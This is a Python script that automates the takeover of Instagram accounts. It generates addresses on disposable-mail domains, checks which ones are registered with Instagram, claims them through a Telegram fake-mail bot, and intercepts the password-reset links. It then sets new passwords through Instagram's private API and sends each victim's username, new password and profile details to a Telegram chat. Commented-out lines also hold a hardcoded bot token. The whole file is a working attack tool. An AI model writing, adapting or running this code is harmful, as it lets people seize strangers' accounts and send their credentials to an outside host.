import os,hashlib
from hashlib import md5
from user_agent import *
import shutil
try:
    import telethon
except:
    os.system("pip install telethon")

try:
    import requests
except:
    os.system("pip install requests")

try:
    import asmix
except:
    os.system("pip install asmix")

try:
    import instaloader
except:
    os.system("pip install instaloader")
from threading import Thread
from telethon.sync import TelegramClient
import time
import random
import requests
import os
from asmix import Instagram
import re
import asyncio
import instaloader
import string
import uuid
from datetime import datetime
import subprocess, hashlib
asyncio.set_event_loop(asyncio.new_event_loop())

bi = 0
hi = 0
gi = 0
bm = 0
def lo():
	print(f'Hit : {hi}  , Good Insta : {gi}, BadGm : {bm} , Bad Insta : {bi}')
def extract_reset_link(email_text):
    match = re.search(r"https://instagram\.com/accounts/password/reset/confirm/[^\s\"']+", email_text)
    return match.group(0) if match else None

import re
def extract_username(text):
    pattern = r"(?:مرحبًا|Hi|سلام|Hola|Hai|こんにちは)\s+[^A-Za-z0-9]*([A-Za-z0-9._]+)"
    match = re.search(pattern, text)
    return match.group(1) if match else None

try:
    with open("tokeeen1.txt", "r") as f:
        token = f.read().strip()
except:
    token = input("Enter token: ").strip()
    with open("tokeeen1.txt", "w") as f:
        f.write(token)


try:
    with open("idee1.txt", "r") as f:
        ID = f.read().strip()
except:
    ID = input("Enter ID: ").strip()
    with open("idee1.txt", "w") as f:
        f.write(ID)
        
try:
    with open("apiid1.txt", "r") as f:
        API_ID = f.read().strip()
except:
    API_ID = input("enter api id : ").strip()
    with open("apiid1.txt", "w") as f:
        f.write(API_ID)

try:
    with open("apihash1.txt", "r") as f:
        API_HASH = f.read().strip()
except:
    API_HASH = input("enter api hash : ").strip()
    with open("apihash1.txt", "w") as f:
        f.write(API_HASH)


def send_instagram_password_reset(username_or_email):
    url = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'x-csrftoken': 'umwHlWf6r3AGDowkZQb47m',
        'x-instagram-ajax': '1018880011',
        'x-requested-with': 'XMLHttpRequest',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/password/reset/'
    }
    data = {'email_or_username': username_or_email, 'flow': 'fxcal'}
    try:
        response = requests.post(url, headers=headers, data=data)
        result = response.json()
        if result.get('status') == 'ok':
            message = result.get('message', 'تم إرسال رابط إعادة التعيين')
            return f"✅ {message}"
        else:
            error_msg = result.get('message', 'فشل إرسال رابط إعادة التعيين')
            return f"❌ {error_msg}"
    except Exception as e:
        return f"❌ حدث خطأ: {str(e)}"

# ====== دوال فحص البريد ======
def check(email):
    global hi, bm
    BOT = '@fakemailbot'
    try:
        client = TelegramClient('session', API_ID, API_HASH)
        client.start()
        sent_msg = client.send_message(BOT, email)
        sent_id = getattr(sent_msg, 'id', None)
        if not sent_id:
            print("لم يتم الحصول على معرّف الرسالة المرسلة.")
            client.disconnect()
            return
        timeout = 20
        deadline = time.time() + timeout
        found = False
        while time.time() < deadline:
            msgs = client.get_messages(BOT, limit=8)
            for m in msgs:
                if not getattr(m, 'out', False) and getattr(m, 'id', 0) > sent_id:
                    text = (m.text or "").strip()
                    if text =="This email address already taken by someone else.":
                        bm += 1
                    elif "Your new fake mail id is" in text:
                        hi += 1
                        result = send_instagram_password_reset(email)
                        time.sleep(4)
                        reset_msgs = client.get_messages(BOT, limit=5)
                        for mm in reset_msgs:
                            mail_text = mm.text or ""
                            if "instagram.com/accounts/password/reset" in mail_text:
                                reset_link = extract_reset_link(mail_text)
                                username = extract_username(mail_text)
                               
                                
                                if reset_link and username:
                                    insta_reset(username, reset_link)
                                break
                        #else:
#                            print("مشكلة صغيرة")
                    else:
                        print("unknown response:", text)
                    found = True
                    break
            if found:
                break
        if not found:
            print(f"انتهت المهلة ولم يصل رد معروف من البوت خلال {timeout} ثانية للإيميل: {email}")
    except Exception as e:
        print(e)
        exit()
    finally:
        try:
            client.disconnect()
        except Exception:
            pass


def insta_reset(username, reset_link):
    def generate_device_info():
        ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
        USER_AGENT = (
            f"Instagram 394.0.0.46.81 Android "
            f"({random.choice(['28/9','29/10','30/11','31/12'])}; "
            f"{random.choice(['240dpi','320dpi','480dpi'])}; "
            f"{random.choice(['720x1280','1080x1920','1440x2560'])}; "
            f"{random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; "
            f"{random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; intel; en_US; "
            f"{random.randint(100000000,999999999)})"
        )
        WATERFALL_ID = str(uuid.uuid4())
        timestamp = int(datetime.now().timestamp())
        nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
        PASSWORD = f"#PWD_INSTAGRAM:0:{timestamp}:Mustafa1tele@{nums}"
        return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

    def make_headers(mid="", user_agent=""):
        return {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "X-Mid": mid,
            "User-Agent": user_agent,
            "Content-Length": "9481"
        }

    def reset_instagram_password(user, reset_link,email):
        try:
            ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
            uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
            token = reset_link.split("&token=")[1].split(":")[0]
            url = "https://i.instagram.com/api/v1/accounts/password_reset/"
            data = {
                "source": "one_click_login_email",
                "uidb36": uidb36,
                "device_id": ANDROID_ID,
                "token": token,
                "waterfall_id": WATERFALL_ID
            }
            r = requests.post(url, headers=make_headers(user_agent=USER_AGENT), data=data)
            #requests.post(f'https://api.telegram.org/bot7913321809:AAErW-QM2HJWUUaci_jT76OcNG1r4QG0OkQ/sendMessage?chat_id=7402878964&text={r.text}')
            
            if "user_id" not in r.text:
                return {"success": False, "error": f"Error: {r.text}"}
            mid = r.headers.get("Ig-Set-X-Mid")
            resp_json = r.json()
            user_id = resp_json.get("user_id")
            cni = resp_json.get("cni")
            nonce_code = resp_json.get("nonce_code")
            challenge_context = resp_json.get("challenge_context")
            url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
            data2 = {
                "user_id": str(user_id),
                "cni": str(cni),
                "nonce_code": str(nonce_code),
                "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
                "challenge_context": str(challenge_context),
                "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
                "get_challenge": "true"
            }
            r2 = requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data2).text
            #requests.post(f'https://api.telegram.org/bot7913321809:AAErW-QM2HJWUUaci_jT76OcNG1r4QG0OkQ/sendMessage?chat_id=7402878964&text={r2} r2')
            if str(cni) not in r2:
                return {"success": False, "error": "Challenge info failed"}
            challenge_context_final = r2.replace("\\", "").split(f"(bk.action.i64.Const, {cni}), \"")[1].split("\", (bk.action.bool.Const, false)))")[0]
            data3 = {
                "is_caa": "False",
                "cni": str(cni),
                "challenge_context": challenge_context_final,
                "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
                "enc_new_password1": PASSWORD,
                "enc_new_password2": PASSWORD
            }
            requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data3)
            new_password = PASSWORD.split(":")[-1]
            return {"success": True, "username": user, "password": new_password}
        except Exception as e:
            return {"success": False, "error": str(e)}

    result = reset_instagram_password(username, reset_link)
    if result.get("success"):
        
        cookies = {
    'csrftoken': 'ntfH-zYTX9AjMHSwDyq9L9',
    'ps_l': '1',
    'ps_n': '1',
    'dpr': '0.75',
    'mid': 'ZthkYQALAAGHFboyOVudcmhApJ2w',
    'datr': 'YWTYZmuSt9PF6R4hZL2czVTr',
    'ig_did': '2F5D9DE7-0672-41C4-9931-F93181185824',
    'wd': '1256x1058',
    'ig_nrcb': '1',
};headers = {
    'accept': '*/*',
    'accept-language': 'en',
    'cookie': 'csrftoken=ntfH-zYTX9AjMHSwDyq9L9; ps_l=1; ps_n=1; dpr=0.75; mid=ZthkYQALAAGHFboyOVudcmhApJ2w; datr=YWTYZmuSt9PF6R4hZL2czVTr; ig_did=2F5D9DE7-0672-41C4-9931-F93181185824; wd=1256x1058; ig_nrcb=1',
    'dnt': '1',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/qqq/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
    'sec-ch-ua-full-version-list': '"Chromium";v="128.0.6613.85", "Not;A=Brand";v="24.0.0.0", "Microsoft Edge";v="128.0.2739.42"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'x-asbd-id': '129477',
    'x-csrftoken': 'ntfH-zYTX9AjMHSwDyq9L9',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-requested-with': 'XMLHttpRequest',
};params = {
    'username': username,
};response = requests.get('https://www.instagram.com/api/v1/users/web_profile_info/',
params=params,
cookies=cookies,
headers=headers,
).json();pic = response['data']['user']['profile_pic_url_hd'];name = response['data']['user']['full_name'];bio = response['data']['user']['biography'];userd =response['data']['user']['username'];id = response['data']['user']['id'];fing= response['data']['user']['edge_follow']['count'];fwers=response['data']['user']['edge_followed_by']['count'];email =response['data']['user']['business_email'];is_private=response['data']['user']['is_private']
        
        ff=f'''
New Account !
	[!]Email : {email} 
	[!]UserName: @{username}
	[!]Password: {result['password']}
~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Followers : {fwers}
	Following : {fing}
~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Name : {name}
	BusinsessEmail : {email}
	bio : {bio}	
	
        '''
        print(ff)
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
    else:
        print("[!] Failed:", result['error'])

def rest(email):
    global bi, bm, hi, gi
    csrftoken ='50881e8091527842720f7e15adbfb15b'# md5(str(time()).encode()).hexdigest()
    url = "https://www.instagram.com/api/v1/web/accounts/check_email/"
    r = requests.post(
        url,
        headers={
            'user-agent': str(generate_user_agent()),
            'x-csrftoken': csrftoken,
        },
        data={'email': email}
    ).text
    if "email_is_taken" in r:
        #return True
        gi+=1
        check(email)
        lo()
    else:
        #return False
        bi+=1
        #lo()
    #url = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
#    headers = {
#        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
#        'content-type': 'application/x-www-form-urlencoded',
#        'x-csrftoken': 'umwHlWf6r3AGDowkZQb47m',
#        'x-instagram-ajax': '1018880011',
#        'x-requested-with': 'XMLHttpRequest',
#        'origin': 'https://www.instagram.com',
#        'referer': 'https://www.instagram.com/accounts/password/reset/'
#    }
#    data = {'email_or_username': email, 'flow': 'fxcal'}
#    lo()
#    try:
#        response = requests.post(url, headers=headers, data=data)
#        result = response.json()
#        if result.get('status') == 'ok':
#            gi += 1
#            check(email)
#            lo()
#        else:
#            bi += 1
#          #  lo()
#    except Exception as e:
#        print('error !!!', e)

import sys
def dele():
    targets = ['apiid.txt', 'apihash.txt', 'session.session']
    deleted = []
    not_found = []
    errors = []

    for path in targets:
        try:
            if os.path.exists(path):
                if os.path.isfile(path) or os.path.islink(path):
                    os.remove(path)
                
                elif os.path.isdir(path):
                    shutil.rmtree(path)
                deleted.append(path)
            else:
                not_found.append(path)
        except Exception as e:
            errors.append((path, str(e)))

    for p in deleted:
        print(f" - Deleted: {p}")
    for p in not_found:
        print(f" - Not found: {p}")
    for p, err in errors:
        print(f" - Error deleting {p}: {err}")

    if deleted:
        sys.exit(0)
    else:
        sys.exit(1)


def qcq():
        memo = random.randint(100, 300)
        while True:
            u = "".join(random.choice('poiuytrewqlkjhgfdsamnbvcxz') for x in range(5))
            ema = ['@hi2.in','@telegmail.com']
            em = random.choice(ema)
            email = u+em
            rest(email)
   

qcq()